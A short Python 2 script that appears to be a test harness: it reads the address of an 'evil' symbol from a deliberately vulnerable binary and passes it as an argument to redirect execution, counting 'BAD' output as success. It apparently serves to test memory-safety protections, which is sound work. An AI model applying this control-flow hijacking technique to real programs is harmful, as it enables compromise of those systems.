import os, struct
from subprocess import *

PI = lambda x: struct.pack('I', x)
PQ = lambda x: struct.pack('Q', x)
UPQ = lambda x: struct.unpack('Q', x)[0]
TARGET = '/home/vuln'

def find_evil():
    p = Popen('readelf -a %s|grep evil' % TARGET, shell=True, stdout=PIPE)
    stdout = p.stdout
    return PQ(int(stdout.read(1000).split()[1], 16)).replace("\x00", "")

def exploit():
    os.putenv('LD_LIBRARY_PATH', '/home/gcc/usr/bin/lib64')
    evil = find_evil()
    p = Popen([TARGET, evil], stderr=PIPE)
    rc = p.wait()
    # SEGV or successfully exit
    output = p.stderr.read()
    print output
    if "BAD" in output:
        return 2 # exploit success
    else:
        return 0 # exploit fail

def run(run_function):
    run_function('target','exploit')
